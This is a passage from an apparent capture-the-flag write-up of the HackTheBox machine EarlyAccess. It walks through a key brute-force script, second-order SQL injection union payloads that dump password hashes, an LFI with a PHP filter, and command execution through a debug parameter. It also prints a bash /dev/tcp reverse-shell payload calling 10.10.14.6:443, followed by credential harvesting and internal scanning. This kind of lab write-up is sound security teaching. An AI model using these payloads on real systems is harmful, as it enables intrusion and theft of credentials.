347: KEY12-0H0H0-XPBA0-GAMD2-1298
348: KEY12-0H0H0-XPCA0-GAMD2-1299
349: KEY12-0H0H0-XPDA0-GAMD2-1300
350: KEY12-0H0H0-XPEA0-GAMD2-1301
351: KEY12-0H0H0-XPFA0-GAMD2-1302
352: KEY12-0H0H0-XPGA0-GAMD2-1303
...[snip]...

```

The validate script uses 346 as an example `magic_num`. That key does validate:

```

oxdf@hacky$ python3 validate.py KEY12-0H0H0-XPAA0-GAMD2-1297
Entered key is valid!

```

### Submitting Keys

60 keys is more than I want to try by hand, so I’ll write a script to try to submit them. I’ll start with what I already have in my `generate_keys.py` script, removing the print statement. I’ll need to login first. Looking at Burp, that’s a POST request to `/login` with the following data:

```

_token=MCEXZS0e7CoOAqPdVF76ZkASD9jOFt4PuCWJsmBc&email=0xdf%40developer.htb&password=0xdf0xdf

```

I’ll need the CSRF token from the page first. Looking at the HTML, it’s right at the top of the page:

```

<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="csrf-token" content="T6yVOQaAZySV8jYfsrtb2Cd5N5cn6JBbsPF7FyO0">

```

I’ll start a session, and grab that token, using [BeautifulSoup](https://www.crummy.com/software/BeautifulSoup/bs4/doc/) to pull it out:

```

s = requests.session()
s.proxies.update({'https':'http://127.0.0.1:8080'})
url = 'https://earlyaccess.htb'

# Get CSRF for login
resp = s.get(f'{url}/login', verify=False)
soup = BeautifulSoup(resp.text, 'html.parser')
csrf = soup.find_all('meta', {"name":"csrf-token"})[0]['content']

```

That token let’s me login:

```

# Login
resp = s.post(f'{url}/login', verify=False,
        data={"_token": csrf, "email": "0xdf@earlyaccess.htb", "password": "0xdf0xdf"})

```

Because I’m using a session object from `requests`, the cookies that come back are stored and sent out in additional requests, keeping me logged in.

Next I can do the same to get the CSRF from the `/key` page:

```

# Get CSRF for key POST
resp = s.get(f'{url}/key', verify=False)
soup = BeautifulSoup(resp.text, 'html.parser')
csrf = soup.find_all('meta', {"name":"csrf-token"})[0]['content']

```

I noticed in Burp that the CSRF didn’t change for successive POSTs to `/key/add`, so I just need to get this once.

Finally, I’ll try submitted keys one by one until that error message isn’t in the response:

```

# Try keys until success
for mn in g3s:
    key = f'{g1}-{g2}-{g3s[mn]}-{g4}-'
    cs = calc_cs(key)
    key = f'{key}{cs}'
    resp = s.post(f'{url}/key/add', verify=False,
            data={"_token": csrf, "key": key})
    if not "Game-key is invalid!" in resp.text:
        print(f"[+] Success with magic number {mn}")
        break

```

Running this takes about 30 seconds before returning success:

```

oxdf@hacky$ time python register_keys.py 
[+] Success with magic number 374

real    0m32.792s
user    0m0.424s
sys     0m0.058s

```

The full script is [here](/files/htb-earlyaccess/register_keys.py).

Back on the page, on refresh, it is no longer asking for a key, but rather it shows the key as added, and is providing the chance to update it:

![image-20210817120234721](https://0xdfimages.gitlab.io/img/image-20210817120234721.png)

## Dev Access

### Enumerate Game

Now back on `game.earlyaccess.htb`, logging in with my account works:

![image-20210817120943616](https://0xdfimages.gitlab.io/img/image-20210817120943616.png)

On being logged in, it redirects to `/game.php`. Clicking “Play” will start a game of [old school snake](https://en.wikipedia.org/wiki/Snake_(video_game_genre)).

![image-20210831075939059](https://0xdfimages.gitlab.io/img/image-20210831075939059.png)

The Scoreboard link (`/scoreboard.php`) gives my top ten scores:

![image-20210905100942087](https://0xdfimages.gitlab.io/img/image-20210905100942087.png)

Modifying my username back on the main domain carries over to this site as well. If I still have HTML entities in my username, they are correctly escaped here:

![image-20210905101015971](https://0xdfimages.gitlab.io/img/image-20210905101015971.png)

I changed it back to 0xdf to make the page more manageable.

The Global Leaderboard (`/leaderboard.php`) gives scores for myself as well as others:

![image-20210905101056399](https://0xdfimages.gitlab.io/img/image-20210905101056399.png)

### Second-Order SQL Injection

#### Identify

There was a forum post talking about the scoreboard crashing with a single quote in the name. I’ll go back to the profile page on the main site and update my name:

![image-20210817135326492](https://0xdfimages.gitlab.io/img/image-20210817135326492.png)

The global leader board is fine, because it just displays my email address:

![image-20210905101129433](https://0xdfimages.gitlab.io/img/image-20210905101129433.png)

But the Scoreboard breaks:

![image-20210817135413726](https://0xdfimages.gitlab.io/img/image-20210817135413726.png)

Based on that error message, I’ll update my name to `0xdf')-- -` to close out the single quote and the parentheses, and then comment out the rest, and it returns an empty scoreboard:

![image-20210817135746845](https://0xdfimages.gitlab.io/img/image-20210817135746845.png)

This actually makes sense, since my username is `0xdf')-- -`, but it’s doing an SQL query to look for cases where the username is `0xdf`, and this user doesn’t exist. This is a second-order SQL injection, because I’m putting data into the database, and then somewhere that data is being read and injecting there.

#### Union Injection

At this point I’ll open two Firefox windows side by side so I can quickly update my name, and refresh the scoreboard:

[![image-20210817135557436](https://0xdfimages.gitlab.io/img/image-20210817135557436.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20210817135557436.png)

To do a UNION injection, first I’ll need to get the number of columns. It has to be at least three (username, score, and time) because those are displayed. I would have guessed four (typically an ID), but it seems that three works with a username of `0xdf') union select 1,2,3-- -`:

![image-20210817140020318](https://0xdfimages.gitlab.io/img/image-20210817140020318.png)

I can list the tables with `0xdf') union select table_name,1,table_schema from information_schema.tables-- -`:

![image-20210817140705431](https://0xdfimages.gitlab.io/img/image-20210817140705431.png)

I don’t so much care about the `information_schema` db, so I’ll focus on the other, `db`. I can list all the columns in those three tables with the username:

```

0xdf') union select table_name,1,column_name from information_schema.columns where table_schema = 'db'-- -;

```

![image-20210817141017697](https://0xdfimages.gitlab.io/img/image-20210817141017697.png)

`users` is the most interesting. I’ll dump the users with:

```

0xdf') union select password,email,name from users;-- -

```

[![image-20210818152131359](https://0xdfimages.gitlab.io/img/image-20210818152131359.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20210818152131359.png)

### Crack Hash

The hash for the admin cracks with a Google search which turns up [this page](https://hashtoolkit.com/decrypt-hash/3a4e24a20ad52afef48852b613da483a):

![image-20210818152309327](https://0xdfimages.gitlab.io/img/image-20210818152309327.png)

That password works to log into the site on `dev.earlyaccess.htb`.

## Shell as www-data on webserver

### dev Site Enumeration

On logging in, I’m redirected to `/home.php`. The site on dev just says welcome:

![image-20210818153448655](https://0xdfimages.gitlab.io/img/image-20210818153448655.png)

There are two links at the top. “Hashing-Tools” leads to `/home.php?tool=hashing`:

![image-20210818154424863](https://0xdfimages.gitlab.io/img/image-20210818154424863.png)

“File-Tools” leads to `/home.php?tool=file`:

![image-20210818154445111](https://0xdfimages.gitlab.io/img/image-20210818154445111.png)

On the hash tool, entering something and pushing Hash at the bottom sends a POST to `/actions/hash.php` with the body:

```

action=hash&redirect=true&password=0xdf&hash_function=md5

```

The response is a 302 redirect back to `/home.php?tool=hashing`, but now the hash is filled in:

![image-20210818154730107](https://0xdfimages.gitlab.io/img/image-20210818154730107.png)

If I send that POST to Repeater and remove the `redirect=true` arguments, the response comes back as a 200:

```

HTTP/1.1 200 OK
Date: Sun, 05 Sep 2021 14:12:24 GMT
Server: Apache/2.4.38 (Debian)
X-Powered-By: PHP/7.4.21
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Vary: Accept-Encoding
Content-Length: 91
Connection: close
Content-Type: text/html; charset=UTF-8

Result for Hash-function (md5) and password (0xdf):<br><br>465e929fc1e0853025faad58fc8cb47d

```

I tried changing the `hash_function` parameter, but anything besides `md5` or `sha1` returned a 302 (even without the `redirect=true`) and the error message at the bottom reads “Only MD5 and SHA1 are currently supported!”

Clicking on “Hash” at the top changes the form to “Verify” mode:

![image-20210818154825495](https://0xdfimages.gitlab.io/img/image-20210818154825495.png)

Here I can enter a hash and a password and see if they match, and this is another POST to the same endpoint, but with the body:

```

action=verify&password=0xdf&hash=465e929fc1e0853025faad58fc8cb47d&hash_function=md5

```

It shows the match:

![image-20210818155126434](https://0xdfimages.gitlab.io/img/image-20210818155126434.png)

If I put in the wrong hash:

![image-20210818155253104](https://0xdfimages.gitlab.io/img/image-20210818155253104.png)

A GET request to `/actions/hash.php` just redirects back to `/home.php`.

### Find LFI

Given the presence of `/actions/hash.php`, I’ll check for `/actions/file.php`, and it’s there:

![image-20210818155647230](https://0xdfimages.gitlab.io/img/image-20210818155647230.png)

Adding `?file=/etc/passwd` to the end of the url doesn’t change the error. I’ll use `wfuzz` to see if I can find a parameter that would return something different. I’ll give `wfuzz` the url (`-u`) of `http://dev.earlyaccess.htb/actions/file.php?FUZZ=/etc/passwd`, where it will replace `FUZZ` with each word from the wordlist given (`-w`). I’m using `--hh 35` to hide all responses of length 35 characters. To find that number, I just started without any `-hh`, and saw a bunch of responses that were 35 characters, so I want to hide that default case.

```

oxdf@hacky$ wfuzz -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u http://dev.earlyaccess.htb/actions/file.php?FUZZ=/etc/passwd --hh 35
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://dev.earlyaccess.htb/actions/file.php?FUZZ=/etc/passwd
Total requests: 2588

=====================================================================
ID           Response   Lines    Word       Chars       Payload                              
=====================================================================

000001316:   500        0 L      10 W       89 Ch       "filepath"                           

Total time: 48.76479
Processed Requests: 2588
Filtered Requests: 2587
Requests/sec.: 53.07106

```

It finds `filepath`. Visiting that url:

![image-20210818160127132](https://0xdfimages.gitlab.io/img/image-20210818160127132.png)

I’ll chance `/etc/passwd` to `.`, and it returned an error:

![image-20210905101402417](https://0xdfimages.gitlab.io/img/image-20210905101402417.png)

Since it throws an error if I try to leave the current directory, I’ll try `file.php`:

![image-20210818160400904](https://0xdfimages.gitlab.io/img/image-20210818160400904.png)

It…works? But nothing’s there. That if the page is using `require`, it should be there. But if it’s using `require_once`, then this page is already loaded, and it won’t load again. What about `hash.php`?

![image-20220208165202110](https://0xdfimages.gitlab.io/img/image-20220208165202110.png)

It’s got an error this time. I’ll try a PHP filter to base64 encode it:

![image-20210818160753262](https://0xdfimages.gitlab.io/img/image-20210818160753262.png)

I’ll save that string to a file, and then decode it:

```

oxdf@hacky$ vim hash.php.b64
oxdf@hacky$ base64 -d hash.php.b64 > hash.php

```

### hash.php Source

At the very top of the source is a function, `hash_pw` which is interesting:

```

  4 function hash_pw($hash_function, $password)
  5 {
  6     // DEVELOPER-NOTE: There has gotta be an easier way...
  7     ob_start();
  8     // Use inputted hash_function to hash password
  9     $hash = @$hash_function($password);
 10     ob_end_clean();
 11     return $hash;
 12 }

```

`ob_start()` and `ob_end_clean()` are just there to buffer error messages, as is the `@` in front of the `$hash_function`. What’s crazy is that PHP lets you treat a string in a variable like a function. I dropped into a PHP terminal to play with this using `php -a`.

```

php > system('whoami');
oxdf
php > $cmd = 'system';
php > $cmd('whoami');
oxdf

```

The `@` at the front just suppresses error messages, so it looks the same:

```

php > @$cmd('whoami');
oxdf

```

So for this example:

```

php > $hash_function = 'md5';
php > $h = $hash_function('0xdf');
php > echo @$h;
465e929fc1e0853025faad58fc8cb47d

```

All of this is to say, if I can get what I want into `$hash_function`, I’ll have code execution.

I already tried sending other things into that parameter, and it returned an error. That check is made here for the `verify` action, on line 25:

```

 16     if(isset($_REQUEST['action']))
 17     {
 18         if($_REQUEST['action'] === "verify")
 19         {                                      
 20             // VERIFIES $password AGAINST $hash
 21
 22             if(isset($_REQUEST['hash_function']) && isset($_REQUEST['hash']) && isset($_REQUEST['password']))
 23             {                                                 
 24                 // Only allow custom hashes, if `debug` is set
 25                 if($_REQUEST['hash_function'] !== "md5" && $_REQUEST['hash_function'] !== "sha1" && !isset($_REQUEST['debug']))
 26                     throw new Exception("Only MD5 and SHA1 are currently supported!");
 27
 28                 $hash = hash_pw($_REQUEST['hash_function'], $_REQUEST['password']);
 29                                                                     
 30                 $_SESSION['verify'] = ($hash === $_REQUEST['hash']);
 31                 header('Location: /home.php?tool=hashing');
 32                 return;
 33             }
 34         }

```

The same check is made on line 50 for the `hash` action:

```

 43         elseif($_REQUEST['action'] === "hash")
 44         {
 45             // HASHES $password USING $hash_function
 46
 47             if(isset($_REQUEST['hash_function']) && isset($_REQUEST['password']))
 48             {
 49                 // Only allow custom hashes, if `debug` is set
 50                 if($_REQUEST['hash_function'] !== "md5" && $_REQUEST['hash_function'] !== "sha1" && !isset($_REQUEST['debug']))
 51                     throw new Exception("Only MD5 and SHA1 are currently supported!");
 52 
 53                 $hash = hash_pw($_REQUEST['hash_function'], $_REQUEST['password']);
 54                 if(!isset($_REQUEST['redirect']))
 55                 {
 56                     echo "Result for Hash-function (" . $_REQUEST['hash_function'] . ") and password (" . $_REQUEST['password'] . "):<br>";
 57                     echo '<br>' . $hash;
 58                     return;
 59                 }
 60                 else
 61                 {
 62                     $_SESSION['hash'] = $hash;
 63                     header('Location: /home.php?tool=hashing');
 64                     return;
 65                 }
 66             }
 67         }

```

In both cases, the developer was nice enough to leave a debug mode which allows the user to pass custom hash functions.

### RCE

I’ll try this in repeater and it works:

[![image-20210818164531285](https://0xdfimages.gitlab.io/img/image-20210818164531285.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20210818164531285.png)

I’ll change `password` to get a reverse shell:

```

action=hash&password=bash+-c+"bash+-i+>%26+/dev/tcp/10.10.14.6/443+0>%261"&hash_function=system&debug=1

```

On sending, a shell comes back:

```

oxdf@hacky$ nc -lnvp 443
listening on [any] 443 ...
connect to [10.10.14.6] from (UNKNOWN) [10.10.11.110] 49100
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
www-data@webserver:/var/www/earlyaccess.htb/dev/actions$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

I’ll use `script` to get a better terminal:

```

www-data@webserver:/var/www/earlyaccess.htb/dev/actions$ script /dev/null -c bash
<rlyaccess.htb/dev/actions$ script /dev/null -c bash      
Script started, file is /dev/null
www-data@webserver:/var/www/earlyaccess.htb/dev/actions$ ^Z
[1]+  Stopped                 nc -lnvp 443
oxdf@hacky$ stty raw -echo ; fg
nc -lnvp 443
            reset
reset: unknown terminal type unknown
Terminal type? screen
www-data@webserver:/var/www/earlyaccess.htb/dev/actions$ 

```

## Shell as www-adm on webserver

### Enumeration

#### Docker

It’s pretty clear quickly that I’m in a docker container. For one, there’s no `ifconfig` or `ip` commands:

```

www-data@webserver:/$ ifconfig
bash: ifconfig: command not found
www-data@webserver:/$ ip addr
bash: ip: command not found

```

The `/proc/net/fib_trie` file shows that current local IP of 172.18.102:

```

www-data@webserver:/$ cat /proc/net/fib_trie
Main:
  +-- 0.0.0.0/0 3 0 5
     |-- 0.0.0.0
        /0 universe UNICAST
...[snip]...
     +-- 172.18.0.0/16 2 0 2
        +-- 172.18.0.0/25 2 0 2
           |-- 172.18.0.0
              /32 link BROADCAST
              /16 link UNICAST
           |-- 172.18.0.102
              /32 host LOCAL
        |-- 172.18.255.255
           /32 link BROADCAST
...[snip]...

```

There’s also a `.dockerenv` file in the system root:

```

www-data@webserver:/$ ls -la .dockerenv 
-rwxr-xr-x 1 root root 0 Aug 18 19:17 .dockerenv

```

I wanted to do a `ping` sweep of the network to look for other containers, but `ping` isn’t on the container either.

#### Home Directories

The container does have one other user, www-adm:

```

www-data@webserver:/home$ ls
www-adm

```

www-data can enter their homedir. It only has config files:

```

www-data@webserver:/home/www-adm$ ls -la
total 24
drwxr-xr-x 2 www-adm www-adm 4096 Aug 18 19:17 .
drwxr-xr-x 1 root    root    4096 Aug 18 19:17 ..
lrwxrwxrwx 1 root    root       9 Aug 18 19:17 .bash_history -> /dev/null
-rw-r--r-- 1 www-adm www-adm  220 Apr 18  2019 .bash_logout
-rw-r--r-- 1 www-adm www-adm 3526 Apr 18  2019 .bashrc
-rw-r--r-- 1 www-adm www-adm  807 Apr 18  2019 .profile
-r-------- 1 www-adm www-adm   33 Aug 18 19:17 .wgetrc

```

`.wgetrc` could be interesting, but I can’t read it.

### Password Reuse

Given the user is the www-adm, and the admin password on the dev site was gameover, it’s worth checking if they use the same password here. They do:

```

www-data@webserver:/home/www-adm$ su www-adm
Password: 
www-adm@webserver:~$

```

## Shell as drew on EarlyAccess

### Enumeration

#### .wgetrc

The `.wgetrc` file does contain creds:

```

www-adm@webserver:~$ cat .wgetrc 
user=api
password=s3CuR3_API_PW!

```

I tried these are creds for the root user (as well as gameover), but it didn’t work.

#### Network

I immediately wanted to find other containers on the network. This actually turned out to be completely unnecessary, but I’ll include it anyway in case it’s interesting.

Without `ping`, I can’t do a ICMP sweep. I found a statically compiled `nping` [here](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nping). It’s kind of link `nmap` + `ping`, though it there are a bunch of packets it can’t generate without root. I was able to do some scanning using TCP in a loop:

```

www-adm@webserver:/var/www/html$ for i in {1..254}; do (/tmp/nping --dest-port [port] -c 1 172.18.0.${i} | grep "completed" &); done

```

I found [this page](https://nullsec.us/top-1-000-tcp-and-udp-ports-nmap-default/) which has a comma separated list of the top 1000 and top 100 ports, so I grabbed the top 100 and put it in there, and ran it. The scans all run in the background, so it immediately returns, and the results come in over time. Eventually I found a bunch of interesting stuff:

```

RECV (10.0160s) Handshake with 172.18.0.1:22 completed
RECV (11.0142s) Handshake with 172.18.0.1:80 completed
RECV (11.0135s) Handshake with 172.18.0.102:80 completed
RECV (27.0345s) Handshake with 172.18.0.1:443 completed
RECV (27.0331s) Handshake with 172.18.0.102:443 completed
RECV (63.0832s) Handshake with 172.18.0.100:3306 completed
RECV (67.0817s) Handshake with 172.18.0.101:5000 completed

```
172.18.0.1 is likely the host device, listening on the same ports (22, 80, and 443). 172.18.0.102 is this container, webserver, which is listening on 80 and 443. That leaves 172.18.0.100 listening on 3306, which is MySQL, and 172.18.0.101 listening on 5000.

`curl` confirms that 172.18.0.101 is the API:

```

www-adm@webserver:/var/www/html$ curl 172.18.0.101:5000
{"message":"Welcome to the game-key verification API! You can verify your keys via: /verify/<game-key>. If you are using manual verification, you have to synchronize the magic_num here. Admin users can verify the database using /check_db.","status":200}

```

#### Source Code

Since I have creds to the API, I might as well look at the configurations and source code for the site to see where/how it is accessing the API. I know the API was being used to verify the game key. The Apache config at `/etc/apache2/site-enabled/000-default.conf` defines how the three servers are configured, as well as the default redirect to `https://earlyaccess.htb`:

```

www-adm@webserver:/etc/apache2/sites-enabled$ cat 000-default.conf 
<VirtualHost _default_:80>
    Redirect permanent / https://earlyaccess.htb/
</VirtualHost>

<VirtualHost *:80>
        ServerName game.earlyaccess.htb

        ServerAdmin chr0x6eos@earlyaccess.htb
        DocumentRoot /var/www/earlyaccess.htb/game/

        ErrorLog /var/log/apache2/error-game.log
        CustomLog /var/log/apache2/access-game.log combined
</VirtualHost>

<VirtualHost *:80>
        ServerName dev.earlyaccess.htb

        ServerAdmin chr0x6eos@earlyaccess.htb
        DocumentRoot /var/www/earlyaccess.htb/dev/

        ErrorLog /var/log/apache2/error-dev.log
        CustomLog /var/log/apache2/access-dev.log combined
</VirtualHost>

<VirtualHost *:443>
        ServerName earlyaccess.htb

        SSLEngine On
        SSLCertificateFile /etc/apache2/ssl/server.crt
        SSLCertificateKeyFile /etc/apache2/ssl/server.key
        ServerAdmin chr0x6eos@earlyaccess.htb
        DocumentRoot /var/www/html/public
        <Directory "/var/www/html">
                AllowOverride all
                Require all granted
        </Directory>

        ErrorLog ${APACHE_LOG_DIR}/error-ssl.log
        CustomLog ${APACHE_LOG_DIR}/access-ssl.log combined
</VirtualHost>

```

The API was hit from the base domain, so I’ll start in `/var/www/html`:

```

www-adm@webserver:/var/www/html$ ls
README.md  artisan    composer.json  config    node_modules       package.json  public     routes      storage  vendor             webpack.mix.js
app        bootstrap  composer.lock  database  package-lock.json  phpunit.xml   resources  server.php  tests    webpack.config.js

```

I first looked at the `routes` folder:

```

www-adm@webserver:/var/www/html$ ls routes/
api.php  channels.php  console.php  web.php

```

I got excited thinking it would be in `api.php`, but there was nothing interesting there. Next I looked at `web.php`. In it, each route is defined, and I was interested in the Game Key related ones:

```

Route::middleware(['auth:sanctum'])->get('key', function () {
    return view('keys');
})->name('key.index');

Route::middleware(['auth:sanctum'])->post('key/add', 'App\Http\Controllers\UserController@add_key')->name('key.create');

```

`App\Http\Controllers\UserController` is interesting, and there’s a similar file `/var/www/html/app/Http/Controllers/UserController.php`. The last function in the file is what I’m looking for:

```

...[snip]...
        public function verify_key(Request $request)
    {
        $this->validate($request, [
            'key' => ['required', 'string'] , //new \App\Rules\ValidKey],
        ]);

        // Throttle admins to 600req/min = 10req/s
        $throttler = Throttle::get($request, 600, $this->timeout);

        if(!$throttler->attempt())
            return redirect()->route('key.index')->withErrors('Too many requests! Please wait (' . $this->timeout . ' min) before retrying!');

        $key = $request->key;
        $resp = API::verify_key($key);

        if ($resp === "Key is valid!")
        {
            return redirect()->route('key.index')->withSuccess('Game-key is valid!');
        }
        else
        {
            return redirect()->route('key.index')->withErrors('Game-key is invalid! DEBUG: ' . $resp);
        }
    }
}

```

It’s calling `API::verify_key($key)`, and creating a result based on that result. Almost at the top of the file I see:

```

use App\Models\API;

```

That leads to `/var/www/html/app/Models/API.php`:

```

<?php

namespace App\Models;

use Illuminate\Database\Eloquent\Factories\HasFactory;
use Illuminate\Database\Eloquent\Model;
use Illuminate\Support\Facades\Http;

class API extends Model
{
    use HasFactory;

    /**
     * Verifies a game-key using the API
     *
     * @param String $key // Game-key to verify
     * @return string //Returns response from API
     */
    public static function verify_key(String $key) : string
    {
        try
        {
            $response = Http::get('http://api:5000/verify/' . $key);
            if (isset($response["message"]))
                return $response["message"];
            else
                return $response->body();
        }
        catch (\Exception $ex)
        {
            return "Unknown error: " . $ex->getMessage();
        }
    }
}

```

It’s making a GET request to `http://api:5000/verify/[key]`. There’s a directory traversal bug here (which I’ll look into in [Beyond Root](#magic-number-leak)). But from here, I can use `curl` to access the API:

```

www-adm@webserver:/var/www/html$ curl http://api:5000                    
{"message":"Welcome to the game-key verification API! You can verify your keys via: /verify/<game-key>. If you are using manual verification, you have to synchronize the magic_num here. Admin users can verify the database using /check_db.","status":200}

```

`curl` can also give the IP of API:

```

www-adm@webserver:/var/www/html$ curl -v http://api:5000/
*   Trying 172.18.0.101...
* TCP_NODELAY set
* Expire in 200 ms for 4 (transfer 0x555fe700efb0)
* Connected to api (172.18.0.101) port 5000 (#0)
> GET / HTTP/1.1
> Host: api:5000
> User-Agent: curl/7.64.0
> Accept: */*
> 
* HTTP 1.0, assume close after body
< HTTP/1.0 200 OK
< Content-Type: application/json
< Content-Length: 254
< Server: Werkzeug/2.0.1 Python/3.8.11
< Date: Thu, 19 Aug 2021 00:22:44 GMT
< 
{"message":"Welcome to the game-key verification API! You can verify your keys via: /verify/<game-key>. If you are using manual verification, you have to synchronize the magic_num here. Admin users can verify the database using /check_db.","status":200}
* Closing connection 0

```

### Game-Key Verification API

The message suggests two endpoints on the API:
- `/verify/[key]`
- `/check_db` - admin users only

Trying to connect to `/check_db` returns an error for bad auth:

```

www-adm@webserver:/var/www/html$ curl http://api:5000/check_db
Invalid HTTP-Auth!

```

I’ll add the creds from the `.wgetrc` file, using the format `http://[user]:[pass]@api:5000/check_db`. It would also work to do `-u [user]:[pass]`:

```

www-adm@webserver:/var/www/html$ curl 'http://api:s3CuR3_API_PW!@api:5000/check_db'         
{"message":{"AppArmorProfile":"docker-default","Args":["--character-set-server=utf8mb4","--collation-server=utf8mb4_bin","--skip-character-set-client-handshake","--max_allowed_packet=50MB","--general_log=0","--sql_mode=ANSI_QUOTES,ERROR_FOR_DIVISION_BY_ZERO,IGNORE_SPACE,NO_ENGINE_SUBSTITUTION,NO_ZERO_DATE,NO_ZERO_IN_DATE,PIPES_AS_CONCAT,REAL_AS_FLOAT,STRICT_ALL_TABLES"],"Config":{"AttachStderr":false,"AttachStdin":false,"AttachStdout":false,"Cmd":["--character-set-server=utf8mb4","--collation-server=utf8mb4_bin","--skip-character-set-client-handshake","--max_allowed_packet=50MB","--general_log=0","--sql_mode=ANSI_QUOTES,ERROR_FOR_DIVISION_BY_ZERO,IGNORE_SPACE,NO_ENGINE_SUBSTITUTION,NO_ZERO_DATE,NO_ZERO_IN_DATE,PIPES_AS_CONCAT,REAL_AS_FLOAT,STRICT_ALL_TABLES"],"Domainname":"","Entrypoint":["docker-entrypoint.sh"],"Env":["MYSQL_DATABASE=db","MYSQL_USER=drew","MYSQL_PASSWORD=drew","MYSQL_ROOT_PASSWORD=XeoNu86JTznxMCQuGHrGutF3Csq5","SERVICE_TAGS=dev","SERVICE_NAME=mysql","PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin","GOSU_VERSION=1.12","MYSQL_MAJOR=8.0","MYSQL_VERSION=8.0.25-1debian10"],"ExposedPorts":{"3306/tcp":{},"33060/tcp":{}},"Healthcheck":{"Interval":5000000000,"Retries":3,"Test":["CMD-SHELL","mysqladmin ping -h 127.0.0.1 --user=$MYSQL_USER -p$MYSQL_PASSWORD --silent"],"Timeout":2000000000},"Hostname":"mysql","Image":"mysql:latest","Labels":{"com.docker.compose.config-hash":"947cb358bc0bb20b87239b0dffe00fd463bd7e10355f6aac2ef1044d8a29e839","com.docker.compose.container-number":"1","com.docker.compose.oneoff":"False","com.docker.compose.project":"app","com.docker.compose.project.config_files":"docker-compose.yml","com.docker.compose.project.working_dir":"/root/app","com.docker.compose.service":"mysql","com.docker.compose.version":"1.29.1"},"OnBuild":null,"OpenStdin":false,"StdinOnce":false,"Tty":true,"User":"","Volumes":{"/docker-entrypoint-initdb.d":{},"/var/lib/mysql":{}},"WorkingDir":""},"Created":"2021-08-18T21:04:53.329299989Z","Driver":"overlay2","ExecIDs":null,"GraphDriver":{"Data":{"LowerDir":"/var/lib/docker/overlay2/aaaf7e5f4395a76d64f49994c6e7d6f5cb10391bac69dfbf0441f26347e94f25-init/diff:/var/lib/docker/overlay2/ecc064365b0367fc58ac796d9d5fe020d9453c68e2563f8f6d4682e38231083e/diff:/var/lib/docker/overlay2/4a21c5c296d0e6d06a3e44e3fa4817ab6f6f8c3612da6ba902dc28ffd749ec4d/diff:/var/lib/docker/overlay2/f0cdcc7bddc58609f75a98300c16282d8151ce18bd89c36be218c52468b3a643/diff:/var/lib/docker/overlay2/01e8af3c602aa396e4cb5af2ed211a6a3145337fa19b123f23e36b006d565fd0/diff:/var/lib/docker/overlay2/55b88ae64530676260fe91d4d3e6b0d763165505d3135a3495677cb10de74a66/diff:/var/lib/docker/overlay2/4064491ac251bcc0b677b0f76de7d5ecf0c17c7d64d7a18debe8b5a99e73e127/diff:/var/lib/docker/overlay2/a60c199d618b0f2001f106393236ba394d683a96003a4e35f58f8a7642dbad4f/diff:/var/lib/docker/overlay2/29b638dc55a69c49df41c3f2ec0f90cc584fac031378ae455ed1458a488ec48d/diff:/var/lib/docker/overlay2/ee59a9d7b93adc69453965d291e66c7d2b3e6402b2aef6e77d367da181b8912f/diff:/var/lib/docker/overlay2/4b5204c09ec7b0cbf22d409408529d79a6d6a472b3c4d40261aa8990ff7a2ea8/diff:/var/lib/docker/overlay2/8178a3527c2a805b3c2fe70e179797282bb426f3e73e8f4134bc2fa2f2c7aa22/diff:/var/lib/docker/overlay2/76b10989e43e43406fc4306e789802258e36323f7c2414e5e1242b6eab4bd3eb/diff","MergedDir":"/var/lib/docker/overlay2/aaaf7e5f4395a76d64f49994c6e7d6f5cb10391bac69dfbf0441f26347e94f25/merged","UpperDir":"/var/lib/docker/overlay2/aaaf7e5f4395a76d64f49994c6e7d6f5cb10391bac69dfbf0441f26347e94f25/diff","WorkDir":"/var/lib/docker/overlay2/aaaf7e5f4395a76d64f49994c6e7d6f5cb10391bac69dfbf0441f26347e94f25/work"},"Name":"overlay2"},"HostConfig":{"AutoRemove":false,"Binds":["/root/app/scripts/init.d:/docker-entrypoint-initdb.d:ro","app_vol_mysql:/var/lib/mysql:rw"],"BlkioDeviceReadBps":null,"BlkioDeviceReadIOps":null,"BlkioDeviceWriteBps":null,"BlkioDeviceWriteIOps":null,"BlkioWeight":0,"BlkioWeightDevice":null,"CapAdd":["SYS_NICE"],"CapDrop":null,"Cgroup":"","CgroupParent":"","CgroupnsMode":"host","ConsoleSize":[0,0],"ContainerIDFile":"","CpuCount":0,"CpuPercent":0,"CpuPeriod":0,"CpuQuota":0,"CpuRealtimePeriod":0,"CpuRealtimeRuntime":0,"CpuShares":0,"CpusetCpus":"","CpusetMems":"","DeviceCgroupRules":null,"DeviceRequests":null,"Devices":null,"Dns":null,"DnsOptions":null,"DnsSearch":null,"ExtraHosts":null,"GroupAdd":null,"IOMaximumBandwidth":0,"IOMaximumIOps":0,"IpcMode":"private","Isolation":"","KernelMemory":0,"KernelMemoryTCP":0,"Links":null,"LogConfig":{"Config":{},"Type":"json-file"},"MaskedPaths":["/proc/asound","/proc/acpi","/proc/kcore","/proc/keys","/proc/latency_stats","/proc/timer_list","/proc/timer_stats","/proc/sched_debug","/proc/scsi","/sys/firmware"],"Memory":0,"MemoryReservation":0,"MemorySwap":0,"MemorySwappiness":null,"NanoCpus":0,"NetworkMode":"app_nw","OomKillDisable":false,"OomScoreAdj":0,"PidMode":"","PidsLimit":null,"PortBindings":{},"Privileged":false,"PublishAllPorts":false,"ReadonlyPaths":["/proc/bus","/proc/fs","/proc/irq","/proc/sys","/proc/sysrq-trigger"],"ReadonlyRootfs":false,"RestartPolicy":{"MaximumRetryCount":0,"Name":"always"},"Runtime":"runc","SecurityOpt":null,"ShmSize":67108864,"UTSMode":"","Ulimits":null,"UsernsMode":"","VolumeDriver":"","VolumesFrom":[]},"HostnamePath":"/var/lib/docker/containers/274eca4459e3a1d2f4b310cbe564e00fe6c62736c28ea1fe99b8c2ad5ed2f9b9/hostname","HostsPath":"/var/lib/docker/containers/274eca4459e3a1d2f4b310cbe5